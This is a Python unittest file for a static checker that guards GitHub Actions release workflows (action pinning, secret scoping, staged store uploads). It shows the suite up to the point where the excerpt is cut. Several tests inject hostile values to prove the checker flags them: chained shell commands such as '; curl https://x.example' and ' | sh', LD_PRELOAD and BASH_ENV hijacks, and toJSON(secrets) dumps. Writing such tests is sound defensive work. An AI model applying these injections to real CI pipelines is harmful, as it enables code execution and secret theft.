from pathlib import Path
import re
import shutil
import tempfile
import unittest

import static_check

ROOT = static_check.ROOT
STORE = ".github/workflows/store-release-draft.yml"
INERT = static_check.INERT
# The held (iOS) upload's if: line, and the active (Android) upload's.
UPLOAD_LINE = "        if: " + static_check.HELD_UPLOAD_IF + "\n"
ANDROID_LINE = "        if: " + static_check.DRY_RUN_UPLOAD_IF + "\n"
ANDROID_UPLOAD = "      - name: Upload update to the internal track only\n"
ANDROID_UPLOAD_COMMENT = "".join("        # " + line + "\n" for line in (
    "Stage 2: active, with no inert guard. github.event.inputs holds the",
    "boolean as a string, and == ignores case, so it runs on any casing of",
    "'false'; a missing value never does. The script then refuses everything",
    "but the exact string false, and any target but May Playground."))
IOS_UPLOAD = "      - name: Upload verified IPA for internal TestFlight\n"
CONFIRM = "      - name: " + static_check.CONFIRM + "\n"


class StaticCheckTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)
        shutil.copytree(ROOT / ".github", self.root / ".github")
        shutil.copytree(ROOT / "tools", self.root / "tools",
                        ignore=shutil.ignore_patterns("__pycache__"))

    def tearDown(self):
        self.directory.cleanup()

    def fresh(self):
        self.tearDown()
        self.setUp()

    def mutate(self, relative, old, new, count=1):
        path = self.root / relative
        text = path.read_text()
        self.assertTrue(old in text, "mutation anchor not found: " + old[:60])
        path.write_text(text.replace(old, new, count))

    def mutate_nth(self, old, new, nth):
        """Replace the nth (0-based) occurrence of old in the store workflow."""
        path = self.root / STORE
        text = path.read_text()
        at = -1
        for _ in range(nth + 1):
            at = text.find(old, at + 1)
            self.assertGreaterEqual(at, 0, "mutation anchor not found: " + old[:60])
        path.write_text(text[:at] + new + text[at + len(old):])

    def assertFlagged(self, fragment):
        found = static_check.problems(self.root)
        self.assertTrue(any(fragment in problem for problem in found), found)

    def test_repository_passes(self):
        self.assertEqual(static_check.problems(ROOT), [])
        self.assertEqual(static_check.problems(self.root), [])

    def test_every_workflow_must_pin_actions_by_sha(self):
        for workflow, old, new in (
                ("claude.yml", "anthropics/claude-code-action@1d6de8cb0c237e7c15e9e1bdf973826ebae490cc",
                 "anthropics/claude-code-action@v1"),
                ("claude-code-review.yml", "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
                 "actions/checkout@v4"),
                ("control-check.yml", "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
                 "actions/checkout@11d5960")):
            with self.subTest(workflow=workflow):
                self.fresh()
                self.mutate(".github/workflows/" + workflow, old, new)
                self.assertFlagged(workflow + ": action reference is not pinned")

    def test_new_workflow_is_covered(self):
        (self.root / ".github/workflows/extra.yaml").write_text(
            "on: push\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/setup-node@v4\n")
        self.assertFlagged("extra.yaml: action reference is not pinned")

    def test_unverified_jdk_and_pip_are_refused(self):
        self.mutate(".github/workflows/control-check.yml", "      - run: |\n          python3 tools/may_release/toolchain.py jdk --export\n",
                    "      - uses: actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3 # v4\n"
                    "      - run: |\n          python3 tools/may_release/toolchain.py jdk --export\n")
        self.assertFlagged("setup-java does not verify its JDK")
        self.fresh()
        self.mutate(STORE, "          python3 -I -S -B tools/may_release/toolchain.py age\n",
                    "          python3 -I -S -B tools/may_release/toolchain.py age\n          python3 -m pip install requests\n")
        self.assertFlagged("installs Python packages")

    def test_secrets_context_only_by_name(self):
        for form in ("${{ secrets['MAY_PLAY_JSON'] }}", "${{ toJSON(secrets) }}", "${{ secrets[format('MAY_{0}', 'X')] }}"):
            with self.subTest(form=form):
                self.fresh()
                self.mutate(".github/workflows/claude.yml", "${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}", form)
                self.assertFlagged("claude.yml: secrets are referenced other than as secrets.NAME")
        self.fresh()
        self.mutate(".github/workflows/native-compile-draft.yml", "    timeout-minutes: 90\n",
                    "    timeout-minutes: 90\n    secrets: inherit\n")
        self.assertFlagged("native-compile-draft.yml: secrets are referenced other than as secrets.NAME")

    def test_checkouts_do_not_persist_credentials_and_marketplace_is_pinned(self):
        self.mutate(".github/workflows/claude.yml", "          persist-credentials: false\n", "")
        self.assertFlagged("claude.yml: a checkout persists its credentials")
        self.fresh()
        self.mutate(".github/workflows/claude-code-review.yml",
                    "plugin_marketplaces: ${{ github.workspace }}/.claude-marketplace/claude-code",
                    "plugin_marketplaces: 'https://github.com/anthropics/claude-code.git'")
        self.assertFlagged("claude-code-review.yml: plugin marketplace is a moving URL")

    def test_deployments_permission_is_refused(self):
        self.mutate(".github/workflows/native-compile-draft.yml", "      actions: read\n    outputs:",
                    "      actions: read\n      deployments: read\n    outputs:")
        self.assertFlagged("requests deployments permission")

    def test_secrets_stay_in_their_own_job_and_step(self):
        moves = (
            ("android-build", "        run: python3 -I -S -B tools/may_release/store.py --platform android",
             "        env:\n          MAY_ANDROID_KEY_PASSWORD: ${{ secrets.MAY_ANDROID_KEY_PASSWORD }}\n"
             "        run: python3 -I -S -B tools/may_release/store.py --platform android"),
            ("android-release", "          MAY_ANDROID_CERT_SHA256: ${{ vars.MAY_ANDROID_CERT_SHA256 }}\n",
             "          MAY_ANDROID_CERT_SHA256: ${{ vars.MAY_ANDROID_CERT_SHA256 }}\n"
             "          MAY_PLAY_JSON: ${{ secrets.MAY_PLAY_JSON }}\n"),
            ("android-release", "          MAY_PLAY_JSON: ${{ secrets.MAY_PLAY_JSON }}\n",
             "          MAY_PLAY_JSON: ${{ secrets.MAY_PLAY_JSON }}\n"
             "          MAY_ARTIFACT_DECRYPT_KEY: ${{ secrets.MAY_ARTIFACT_DECRYPT_KEY }}\n"),
            ("ios-build", "        run: python3 -I -S -B tools/may_release/store.py --platform ios",
             "        env:\n          MAY_IOS_CERT_PASSWORD: ${{ secrets.MAY_IOS_CERT_PASSWORD }}\n"
             "        run: python3 -I -S -B tools/may_release/store.py --platform ios"),
            ("ios-release", "    timeout-minutes: 60\n",
             "    timeout-minutes: 60\n    env:\n      MAY_ASC_KEY_BASE64: ${{ secrets.MAY_ASC_KEY_BASE64 }}\n"),
        )
        for job, old, new in moves:
            with self.subTest(job=job, new=new.strip()[:60]):
                self.fresh()
                self.mutate(STORE, old, new)
                found = static_check.problems(self.root)
                self.assertTrue(any(problem.startswith("store " + job) for problem in found), found)

    def test_build_and_release_must_be_separate_jobs(self):
        # Signing moved back into the build job (same VM as third-party build code).
        self.mutate(STORE, "      - name: Encrypt unsigned bundle to the target's public key\n",
                    "      - name: Sign and verify Android App Bundle\n        env:\n"
                    "          MAY_ANDROID_KEY_PASSWORD: ${{ secrets.MAY_ANDROID_KEY_PASSWORD }}\n"
                    "        run: python3 -I -S -B tools/may_release/sign.py --platform android\n"
                    "      - name: Encrypt unsigned bundle to the target's public key\n")
        self.assertFlagged("store android-build: a step holds secrets it does not need")
        self.fresh()
        self.mutate(STORE, "    needs: [admission, android-build]\n", "    needs: admission\n")
        self.assertFlagged("store android-release: does not run after its own build job")
        self.fresh()
        self.mutate(STORE, "    environment: ${{ needs.admission.outputs.build_environment }}\n",
                    "    environment: ${{ needs.admission.outputs.environment }}\n")
        self.assertFlagged("environment is not the one admission checked")

    def test_release_job_runs_only_this_repositorys_python(self):
        self.mutate(STORE, "        run: python3 -I -S -B tools/may_release/sign.py --platform android",
                    "        run: ./gradlew signingReport && python3 -I -S -B tools/may_release/sign.py --platform android")
        self.assertFlagged("store android-release: runs a command that is not this repository's Python")
        self.fresh()
        self.mutate(STORE, "      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4\n",
                    "      - uses: some/action@" + "a" * 40 + "\n"
                    "      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4\n")
        self.assertFlagged("store android-release: uses an action it does not need")

    def test_release_commands_cannot_chain_or_substitute(self):
        base = 'run: python3 -I -S -B tools/may_release/sign.py --platform android --target "$MAY_TARGET"'
        for injected in ('; curl https://x.example', ' | sh', ' && id', ' `id`', ' $(id)', ' > /tmp/x'):
            with self.subTest(injected=injected):
                self.fresh()
                self.mutate(STORE, base, base + injected)
                self.assertFlagged("store android-release: runs a command that is not this repository's Python")
        self.fresh()
        self.mutate(STORE, "        run: python3 -I -S -B tools/may_release/cleanup.py release\n",
                    "        run: rm -rf -- \"$RUNNER_TEMP/may-private\"\n", 1)
        self.assertFlagged("store android-release: runs a command that is not this repository's Python")

    def test_release_jobs_take_no_undeclared_env_or_shell(self):
        cases = (
            ("    timeout-minutes: 30\n", "    timeout-minutes: 30\n    defaults:\n      run:\n        shell: bash\n",
             "store android-release: overrides the shell"),
            ("      MAY_BUILD_NUMBER: ${{ inputs.build_number }}\n    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4\n        with:\n          persist-credentials: false\n      - name: Recheck protected destination after Samuel's review\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: python3 -I -S -B tools/may_release/gate.py --action android",
             "      MAY_BUILD_NUMBER: ${{ inputs.build_number }}\n      LD_PRELOAD: /tmp/x.so\n    steps:\n      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4\n        with:\n          persist-credentials: false\n      - name: Recheck protected destination after Samuel's review\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: python3 -I -S -B tools/may_release/gate.py --action android",
             "store android-release: sets an environment variable it does not declare"),
            ("          MAY_PLAY_ACCOUNT: ${{ vars.MAY_PLAY_ACCOUNT }}\n",
             "          MAY_PLAY_ACCOUNT: ${{ vars.MAY_PLAY_ACCOUNT }}\n          PYTHONPATH: /tmp\n",
             "store android-release: sets an environment variable it does not declare"),
            ("          MAY_PLAY_ACCOUNT: ${{ vars.MAY_PLAY_ACCOUNT }}\n",
             "          MAY_PLAY_ACCOUNT: ${{ secrets.MAY_PLAY_JSON }}\n",
             "store android-release: sets an environment variable it does not declare"),
            ("        run: python3 -I -S -B tools/may_release/sign.py --platform ios",
             "        shell: bash\n        run: python3 -I -S -B tools/may_release/sign.py --platform ios",
             "store ios-release: overrides the shell"),
            ("permissions:\n  contents: read\nconcurrency:", "permissions:\n  contents: read\nenv:\n  BASH_ENV: /tmp/x\nconcurrency:",
             "sets workflow-level env or defaults"),
        )
        for old, new, expected in cases:
            with self.subTest(expected=expected, new=new[-40:]):
                self.fresh()
                self.mutate(STORE, old, new)
                self.assertFlagged(expected)

    def test_release_scripts_run_isolated_after_an_integrity_check(self):
        self.mutate(STORE, "        run: python3 -I -S -B tools/may_release/sign.py --platform android",
                    "        run: python3 tools/may_release/sign.py --platform android")
        self.assertFlagged("store android-release: runs a command that is not this repository's Python")
        self.fresh()
        self.mutate(STORE, "      - name: Check the checkout is exactly its commit before uploading\n"
                           "        run: python3 -I -S -B tools/may_release/integrity.py\n", "", 1)
        self.assertFlagged("store android-release: a secret step is not preceded by the checkout integrity check")

    def test_integrity_check_cannot_be_skipped_by_a_dash_line_if(self):
        check = "Check the checkout is exactly its commit before uploading"
        for job, at in (("android-release", 0), ("ios-release", 1)):
            with self.subTest(job=job):
                self.fresh()
                path = self.root / STORE
                text = path.read_text()
                old = "      - name: " + check + "\n"
                start = text.find(old) if at == 0 else text.find(old, text.find(old) + 1)
                self.assertGreaterEqual(start, 0)
                path.write_text(text[:start] + "      - if: ${{ github.event.inputs.dry_run == 'true' }}\n"
                                "        name: " + check + "\n" + text[start + len(old):])
                self.assertFlagged("store " + job + ": a step other than the upload or dry-run report is conditional")
                self.assertFlagged("store " + job + ": the integrity check before a secret step is conditional")

    def test_flow_style_env_is_refused(self):
        self.mutate(STORE, "        env:\n          MAY_DRY_RUN: ${{ github.event.inputs.dry_run }}\n"
                           "          MAY_PLAY_JSON: ${{ secrets.MAY_PLAY_JSON }}\n"
                           "          MAY_PLAY_ACCOUNT: ${{ vars.MAY_PLAY_ACCOUNT }}\n",
                    "        env: { MAY_PLAY_JSON: '${{ secrets.MAY_PLAY_JSON }}', LD_PRELOAD: /tmp/x.so }\n")
        self.assertFlagged("store-release-draft.yml: uses a flow-style env mapping")

    def test_handoff_artifact_is_bound_to_the_run_attempt(self):
        self.mutate(STORE, "          name: may-handoff-ios-${{ github.run_attempt }}\n", "          name: may-handoff-ios\n")
        self.assertFlagged("handoff artifact is not bound to this run attempt")

    def test_pinned_jdk_is_never_installed_on_macos(self):
        self.mutate(".github/workflows/native-compile-draft.yml",
                    "runs-on: ${{ inputs.platform == 'android' && 'ubuntu-24.04' || 'macos-15' }}", "runs-on: macos-15")
        self.assertFlagged("native-compile-draft.yml: job native installs the linux-only pinned JDK on macOS")

    def test_only_the_encrypted_handoff_is_uploaded(self):
        self.mutate(STORE, "          path: ${{ runner.temp }}/may-handoff/handoff.age\n",
                    "          path: ${{ runner.temp }}/may-release/unsigned.aab\n")
        self.assertFlagged("uploads something other than the encrypted handoff")

    def test_printed_error_messages_must_be_literals(self):
        cases = (
            ("tools/may_release/play_upload.py", 'raise StoreError("Google Play returned a different version code")',
             'raise StoreError(f"Google Play returned {uploaded}")'),
            ("tools/may_release/gate.py", 'raise GateDenial("Protected environment metadata unavailable") from None',
             'raise GateDenial("Protected environment metadata unavailable: " + str(error)) from None'),
            ("tools/may_release/ios_upload.py", 'verify.ipa_identity(ipa, APPLE_TEAM, app_id, build_number)',
             'raise verify.VerifyError(str(ipa))'),
            ("tools/may_release/handoff.py", 'raise StoreError("Build handoff contents are unexpected")',
             'raise HandoffError(str(names))'),
            ("tools/may_release/handoff.py", 'raise StoreError("Re-run all jobs: this release only accepts a build from the same run attempt")',
             'raise StoreError'),
        )
        for path, old, new in cases:
            with self.subTest(new=new):
                self.fresh()
                self.mutate(path, old, new)
                if "HandoffError" in new:
                    self.mutate(path, "FORMAT = ", "class HandoffError(StoreError):\n    pass\n\n\nFORMAT = ")
                for found in (static_check.message_problems(self.root), static_check.problems(self.root)):
                    self.assertTrue(any(Path(path).name in problem for problem in found), found)

    def test_compile_workflow_stays_inert(self):
        self.mutate(".github/workflows/native-compile-draft.yml",
                    "if: ${{ github.event_name == 'may-compile-disabled-pending-review' }}",
                    "if: ${{ github.event_name == 'workflow_dispatch' }}")
        self.assertFlagged("native-compile-draft.yml is not inert")

    def test_stage_2_is_exactly_android_uploads(self):
        store = (ROOT / STORE).read_text()
        for job, expected in static_check.STORE_JOB_IF.items():
            header = static_check.job_text(store, job).partition("    steps:\n")[0]
            with self.subTest(job=job):
                self.assertEqual([c.strip() for c in re.findall(r"(?m)^    if: (.+)$", header)],
                                 [expected] if expected else [])
        self.assertEqual(static_check.STAGE, "stage 2")
        self.assertEqual(static_check.STORE_JOB_IF["admission"], None)
        self.assertNotIn(INERT, static_check.STORE_JOB_IF["android-build"] + static_check.STORE_JOB_IF["android-release"])
        self.assertIn(INERT, static_check.STORE_JOB_IF["ios-build"])
        self.assertIn(INERT, static_check.STORE_JOB_IF["ios-release"])
        # The Android upload is active with no guard; the iOS upload is still held.
        self.assertEqual(static_check.UPLOAD_IF, {"android-release": "${{ github.event.inputs.dry_run == 'false' }}",
                                                  "ios-release": "${{ " + INERT + " && github.event.inputs.dry_run == 'false' }}"})
        self.assertEqual(store.count(ANDROID_UPLOAD + ANDROID_UPLOAD_COMMENT + "        id: play_upload\n" + ANDROID_LINE), 1)
        self.assertEqual(store.count(UPLOAD_LINE), 1)
        self.assertEqual(store.count("        if: " + static_check.REPORT_IF + "\n"), 2)
        self.assertEqual(store.count("        if: " + static_check.CONFIRM_IF + "\n"), 2)
        self.assertEqual(static_check.PLAY_UPLOAD_TRACKS, {"playground": "internal"})

    def test_android_upload_with_its_guard_left_on_is_a_stage_mismatch(self):
        # Stage 1's line kept on the Android upload, with gate.py still saying it is active.
        self.mutate(STORE, ANDROID_LINE, UPLOAD_LINE)
        self.assertEqual(sorted(static_check.problems(self.root)), sorted([
            "store android-release: the upload is held inert, but stage 2 activates it "
            "(stage mismatch: change UPLOAD_IF in static_check.py on purpose)",
            "store-release-draft.yml: the inert guard appears or is missing somewhere stage 2 does not expect",
            "gate.py: UPLOADS_HELD is not exactly the platforms whose upload is held (stage 2), so admission would "
            "admit dry_run: false for a held upload or refuse it for an active one"]))

    def test_full_revert_to_stage_1_is_flagged_not_accepted(self):
        # The guard back on the Android upload and "android" back in UPLOADS_HELD:
        # consistent with each other, but not stage 2.
        self.mutate(STORE, ANDROID_LINE, UPLOAD_LINE)
        self.mutate("tools/may_release/gate.py", 'UPLOADS_HELD = {"ios"}', 'UPLOADS_HELD = {"android", "ios"}')
        found = static_check.problems(self.root)
        self.assertIn("store android-release: the upload is held inert, but stage 2 activates it "
                      "(stage mismatch: change UPLOAD_IF in static_check.py on purpose)", found)
        self.assertIn("store-release-draft.yml: the inert guard appears or is missing somewhere stage 2 does not expect", found)

    def test_full_revert_to_inert_is_flagged_not_accepted(self):
        # The pre-activation layout: all five jobs guarded, uploads only dry-run-conditional.
        self.mutate(STORE, "  admission:\n", "  admission:\n    if: ${{ " + INERT + " }}\n")
        self.mutate(STORE, "    if: ${{ inputs.platform == 'android' }}\n",
                    "    if: ${{ " + INERT + " && inputs.platform == 'android' }}\n", 2)
        self.mutate(STORE, UPLOAD_LINE, ANDROID_LINE)
        self.mutate("tools/may_release/gate.py", 'UPLOADS_HELD = {"ios"}', 'UPLOADS_HELD = set()')
        found = static_check.problems(self.root)
        for job in ("admission", "android-build", "android-release"):
            self.assertTrue(any(p.startswith("store " + job + ": the job is held inert, but stage 2 activates it")
                                for p in found), found)
        self.assertIn("store ios-release: the upload is not held inert (stage 2)", found)

    def test_ios_upload_unguarded_is_flagged(self):
        # A partial lift: the iOS upload loses its guard, with gate.py following it.
        self.mutate(STORE, UPLOAD_LINE, ANDROID_LINE)
        self.mutate("tools/may_release/gate.py", 'UPLOADS_HELD = {"ios"}', 'UPLOADS_HELD = set()')
        self.assertEqual(sorted(static_check.problems(self.root)), sorted([
            "store ios-release: the upload is not held inert (stage 2)",
            "store-release-draft.yml: the inert guard appears or is missing somewhere stage 2 does not expect"]))
        # Without gate.py following, admission would refuse it: also flagged.
        self.fresh()
        self.mutate(STORE, UPLOAD_LINE, ANDROID_LINE)
        self.assertFlagged("gate.py: UPLOADS_HELD is not exactly the platforms whose upload is held (stage 2)")
        self.assertFlagged("store ios-release: the upload is not held inert (stage 2)")

    def test_ios_jobs_unguarded_are_flagged(self):
        guarded = "    if: ${{ " + INERT + " && inputs.platform == 'ios' }}\n"
        self.mutate(STORE, guarded, "    if: ${{ inputs.platform == 'ios' }}\n", 2)
        self.assertEqual(sorted(static_check.problems(self.root)), sorted([
            "store ios-build: the job is not held inert (stage 2)",
            "store ios-release: the job is not held inert (stage 2)",
            "store-release-draft.yml: the inert guard appears or is missing somewhere stage 2 does not expect"]))

    def test_upload_guard_cannot_be_removed(self):
        # Removing the iOS upload's guard leaves the active form: the dry-run rule alone would accept it.
        self.mutate(STORE, UPLOAD_LINE, ANDROID_LINE)
        found = static_check.problems(self.root)
        # gate.py's UPLOADS_HELD must follow, or admission would still refuse dry_run: false.
        self.assertEqual(sorted(found), sorted([
            "store ios-release: the upload is not held inert (stage 2)",
            "store-release-draft.yml: the inert guard appears or is missing somewhere stage 2 does not expect",
            "gate.py: UPLOADS_HELD is not exactly the platforms whose upload is held (stage 2), so admission would "
            "admit dry_run: false for a held upload or refuse it for an active one"]))

    def test_held_upload_guard_must_be_exactly_its_form(self):
        for new in ("${{ " + INERT + " }}",
                    "${{ " + INERT + " && github.event.inputs.dry_run != 'true' }}",
                    "${{ " + INERT + " || github.event.inputs.dry_run == 'false' }}",
                    "${{ github.event.inputs.dry_run == 'false' && " + INERT + " }}",
                    "${{ " + INERT + " && github.event.inputs.dry_run == 'false' || always() }}"):
            with self.subTest(new=new):
                self.fresh()
                self.mutate(STORE, UPLOAD_LINE, "        if: " + new + "\n")
                self.assertTrue(any(fragment in problem for problem in static_check.problems(self.root)
                                    for fragment in ("store ios-release: the upload is not held inert",
                                                     "store ios-release: a dry run would run the store upload")))

    def test_active_upload_must_be_exactly_the_stage_2_form(self):
        for new in ("${{ github.event.inputs.dry_run != 'true' }}",
                    "${{ !inputs.dry_run }}",
                    "always()",
                    "${{ github.event.inputs.dry_run == 'false' || always() }}",
                    "${{ " + INERT + " || github.event.inputs.dry_run == 'false' }}",
                    "${{ github.event.inputs.dry_run == 'false' && " + INERT + " }}"):
            with self.subTest(new=new):
                self.fresh()
                self.mutate(STORE, ANDROID_LINE, "        if: " + new + "\n")
                self.assertTrue(any(fragment in problem for problem in static_check.problems(self.root)
                                    for fragment in ("store android-release: the upload is held inert",
                                                     "store android-release: a dry run would run the store upload")))

    def test_ios_jobs_stay_inert(self):
        guarded = "    if: ${{ " + INERT + " && inputs.platform == 'ios' }}\n"
        for job, nth in (("ios-build", 0), ("ios-release", 1)):
            for new, expected in (("    if: ${{ inputs.platform == 'ios' }}\n", "the job is not held inert (stage 2)"),
                                  ("", "the job is not held inert (stage 2)"),
                                  ("    if: ${{ " + INERT + " }}\n", "the inert job does not keep its exact platform condition")):
                with self.subTest(job=job, new=new.strip()):
                    self.fresh()
                    self.mutate_nth(guarded, new, nth)
                    self.assertFlagged("store " + job + ": " + expected)

    def test_readding_a_guard_to_an_active_job_is_a_stage_mismatch(self):
        cases = (
            ("admission", "  admission:\n", "  admission:\n    if: ${{ " + INERT + " }}\n"),
            ("android-build", "  android-build:\n    needs: admission\n    if: ${{ inputs.platform == 'android' }}\n",
             "  android-build:\n    needs: admission\n    if: ${{ " + INERT + " && inputs.platform == 'android' }}\n"),
            ("android-release", "    if: ${{ inputs.platform == 'android' }}\n    runs-on: ubuntu-24.04\n    environment: ${{ needs.admission.outputs.environment }}\n",
             "    if: ${{ " + INERT + " && inputs.platform == 'android' }}\n    runs-on: ubuntu-24.04\n    environment: ${{ needs.admission.outputs.environment }}\n"),
        )
        for job, old, new in cases:
            with self.subTest(job=job):
                self.fresh()
                self.mutate(STORE, old, new)
                self.assertFlagged("store " + job + ": the job is held inert, but stage 2 activates it (stage mismatch")
                self.assertFlagged("the inert guard appears or is missing somewhere stage 2 does not expect")

    def test_android_jobs_keep_their_platform_condition(self):
        for new in ("", "    if: ${{ inputs.platform == 'ios' }}\n", "    if: always()\n",
                    "    if: ${{ inputs.platform == 'android' || true }}\n"):
            for job, nth in (("android-build", 0), ("android-release", 1)):
                with self.subTest(job=job, new=new.strip()):
                    self.fresh()
                    self.mutate_nth("    if: ${{ inputs.platform == 'android' }}\n", new, nth)
                    self.assertFlagged("store " + job + ": does not keep its platform condition")

    def test_guard_anywhere_else_is_flagged(self):
        self.mutate(STORE, "      MAY_TARGET: ${{ inputs.target }}\n",
                    "      MAY_TARGET: ${{ inputs.target }}\n      MAY_HELD: ${{ " + INERT + " }}\n")
        self.assertFlagged("the inert guard appears or is missing somewhere stage 2 does not expect")
        self.fresh()
        # Named in a comment, it is prose and does not count.
        self.mutate(STORE, "  admission:\n", "  admission:\n    # was: if: ${{ " + INERT + " }}\n")
        self.assertEqual(static_check.problems(self.root), [])

    def test_dash_line_if_is_still_caught(self):
        # Each upload's condition moved to the dash line is the same condition and passes.
        for line, header, step_id in ((UPLOAD_LINE, IOS_UPLOAD, "testflight_upload"),
                                      (ANDROID_LINE, ANDROID_UPLOAD, "play_upload")):
            with self.subTest(step_id=step_id):
                self.fresh()
                self.mutate(STORE, line, "")
                self.mutate(STORE, header, "      - " + line.strip() + "\n        " + header[8:])
                self.assertEqual(static_check.problems(self.root), [])
        # Without the guard, on the dash line, the iOS upload is not held inert;
        # with it, the Android upload is a stage mismatch.
        self.fresh()
        self.mutate(STORE, UPLOAD_LINE, "")
        self.mutate(STORE, IOS_UPLOAD, "      - " + ANDROID_LINE.strip() + "\n        " + IOS_UPLOAD[8:])
        self.assertFlagged("store ios-release: the upload is not held inert (stage 2)")
        self.fresh()
        self.mutate(STORE, ANDROID_LINE, "")
        self.mutate(STORE, ANDROID_UPLOAD, "      - " + UPLOAD_LINE.strip() + "\n        " + ANDROID_UPLOAD[8:])
        self.assertFlagged("store android-release: the upload is held inert, but stage 2 activates it")
        # A second, dash-line if: beside the existing one is refused whichever one GitHub would read.
        for line, header, job in ((UPLOAD_LINE, IOS_UPLOAD, "ios-release"),
                                  (ANDROID_LINE, ANDROID_UPLOAD, "android-release")):
            with self.subTest(job=job):
                self.fresh()
                self.mutate(STORE, header, "      - if: " + static_check.DRY_RUN_UPLOAD_IF + "\n        " + header[8:])
                self.assertFlagged("store " + job + ": a step has more than one if:")
                self.fresh()
                self.mutate(STORE, line, line + "        if: " + static_check.DRY_RUN_UPLOAD_IF + "\n")
                self.assertFlagged("store " + job + ": a step has more than one if:")
        # A dash-line guard on another step is conditional and an unexpected guard.
        self.fresh()
        self.mutate(STORE, "      - name: Sign and verify Android App Bundle\n",
                    "      - if: ${{ " + INERT + " }}\n        name: Sign and verify Android App Bundle\n")
        self.assertFlagged("store android-release: a step other than the upload or dry-run report is conditional")
        self.assertFlagged("the inert guard appears or is missing somewhere stage 2 does not expect")

    def test_loud_failure_check_follows_each_upload(self):
        loud = ": a dispatch with dry_run: false could end green without uploading"
        for job, platform, step_id in (("android-release", "android", "play_upload"),
                                       ("ios-release", "ios", "testflight_upload")):
            text = (ROOT / STORE).read_text()
            start = text.find(CONFIRM, text.find("  " + job + ":\n"))
            end = text.find("      - name: ", start + 1)
            step = text[start:end]
            confirm_line = "        if: " + static_check.CONFIRM_IF + "\n"
            outcome = "          MAY_UPLOAD_OUTCOME: ${{ steps." + step_id + ".outcome }}\n"
            mutations = (
                (step, ""),  # removed: a skipped upload would go green
                (step, step.replace(confirm_line, "")),  # unconditional: a failed earlier step skips it
                (step, step.replace(confirm_line, "        if: " + static_check.DRY_RUN_UPLOAD_IF + "\n")),
                (step, step.replace(confirm_line, "        if: ${{ always() && github.event.inputs.dry_run == 'true' }}\n")),
                (step, step.replace(outcome, "          MAY_UPLOAD_OUTCOME: success\n")),
                (step, step.replace(outcome, "          MAY_UPLOAD_OUTCOME: ${{ steps.other.outcome }}\n")),
                (step, step.replace("confirm_upload.py --platform " + platform, "dry_run.py --platform " + platform)),
                (step, step.replace(" --platform " + platform, " --platform " + ("ios" if platform == "android" else "android"))),
                ("        id: " + step_id + "\n", ""),  # the upload no longer has the id it reads
                ("        id: " + step_id + "\n", "        id: " + step_id + "_x\n"),
            )
            for old, new in mutations:
                with self.subTest(job=job, new=new[-70:]):
                    self.fresh()
                    path = self.root / STORE
                    current = path.read_text()
                    at = current.find(old, current.find("  " + job + ":\n"))
                    self.assertGreaterEqual(at, 0)
                    path.write_text(current[:at] + new + current[at + len(old):])
                    self.assertFlagged("store " + job + loud)
            with self.subTest(job=job, moved="after the report"):
                self.fresh()
                path = self.root / STORE
                current = path.read_text()
                report_start = current.find("      - name: " + static_check.REPORT, current.find("  " + job + ":\n"))
                report_end = current.find("      - name: ", report_start + 1)
                report = current[report_start:report_end]
                moved = current.replace(step + report, report + step, 1)
                self.assertNotEqual(moved, current)
                path.write_text(moved)
                self.assertFlagged("store " + job + loud)
        # Held by the guard, it would not run when the iOS upload's guard comes off.
        self.fresh()
        self.mutate_nth("        if: " + static_check.CONFIRM_IF + "\n",
                        "        if: ${{ " + INERT + " && !cancelled() && github.event.inputs.dry_run == 'false' }}\n", 1)
        self.assertFlagged("store ios-release" + loud)
        self.assertFlagged("the inert guard appears or is missing somewhere stage 2 does not expect")

    def test_only_the_internal_track_of_may_playground_is_reachable(self):
        tracks = "tools/may_release/store.py"
        for new in ('PLAY_UPLOAD_TRACKS = {"playground": "production"}',
                    'PLAY_UPLOAD_TRACKS = {"playground": "beta"}',
                    'PLAY_UPLOAD_TRACKS = {"playground": "internal", "production": "internal"}',
                    'PLAY_UPLOAD_TRACKS = {"production": "internal"}',
                    'PLAY_UPLOAD_TRACKS = dict(playground="internal")'):
            with self.subTest(new=new):
                self.fresh()
                self.mutate(tracks, 'PLAY_UPLOAD_TRACKS = {"playground": "internal"}', new)
                self.assertFlagged("store.py: PLAY_UPLOAD_TRACKS is not exactly stage 2's")
        for old, new in (('TRACK = "internal"', 'TRACK = "production"'),
                         ('f"{base}/{edit}/tracks/{TRACK}"', 'f"{base}/{edit}/tracks/production"'),
                         ('        checked_json(session.post(\n            f"{base}/{edit}:commit',
                          '        session.put(f"{base}/{edit}/tracks/production", json={}, timeout=30)\n'
                          '        checked_json(session.post(\n            f"{base}/{edit}:commit')):
            with self.subTest(new=new[:60]):
                self.fresh()
                self.mutate("tools/may_release/play_upload.py", old, new)
                self.assertFlagged("play_upload.py: writes a track other than the Play internal track")

    def test_job_has_one_condition(self):
        self.mutate(STORE, "    if: ${{ " + INERT + " && inputs.platform == 'ios' }}\n",
                    "    if: ${{ " + INERT + " && inputs.platform == 'ios' }}\n    if: ${{ inputs.platform == 'ios' }}\n")
        self.assertFlagged("store ios-build: has more than one job-level if:")

    def test_admission_runs_exactly_the_gate_unconditionally(self):
        gate = "      - id: gate\n"
        for old, new in ((gate, "      - id: gate\n        if: ${{ inputs.platform == 'ios' }}\n"),
                         (gate, "      - if: false\n        id: gate\n"),
                         (gate, "      - id: gate\n        continue-on-error: true\n"),
                         ("    outputs:\n      environment:", "    continue-on-error: true\n    outputs:\n      environment:"),
                         ('tools/may_release/gate.py --action "$MAY_PLATFORM"', 'tools/may_release/gate.py --action compile')):
            with self.subTest(new=new.strip()):
                self.fresh()
                self.mutate(STORE, old, new)
                self.assertFlagged("store admission: does not run exactly the gate, unconditionally")

    def test_admission_refuses_dry_run_false_for_held_uploads(self):
        cases = (
            (STORE, ' --dry-run "$MAY_DRY_RUN"\n', "\n",
             "store admission: does not run exactly the gate, unconditionally"),
